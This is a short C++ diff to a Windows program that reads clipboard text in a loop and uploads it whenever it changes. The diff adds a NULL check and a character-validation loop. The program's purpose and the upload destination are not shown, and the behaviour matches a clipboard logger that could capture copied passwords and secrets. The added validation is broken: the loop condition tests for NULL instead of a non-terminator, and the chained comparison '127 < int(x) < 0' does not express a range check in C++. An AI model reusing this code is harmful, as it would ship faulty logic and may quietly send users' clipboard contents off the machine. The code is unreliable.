@@ -28,10 +28,17 @@ int main() {
                 HANDLE clipboardHandle;
                 clipboardHandle = GetClipboardData(CF_TEXT);
                 char* clipboardData = (char*)GlobalLock(clipboardHandle);
-                string str(clipboardData);
-                if (dataLastSent.compare(str) != 0) {
-                    dataLastSent = str;
-                    uploadClipboardData(dataLastSent);
+                if (clipboardData != NULL) {
+                    for (int i = 0; clipboardData[i] == NULL; i++) {
+                        if (127 < int(clipboardData[i]) < 0) {
+                            return 1;
+                        }
+                    }
+                    string str(clipboardData);
+                    if (dataLastSent.compare(str) != 0) {
+                        dataLastSent = str;
+                        uploadClipboardData(dataLastSent);
+                    }
                 }
             }
         }
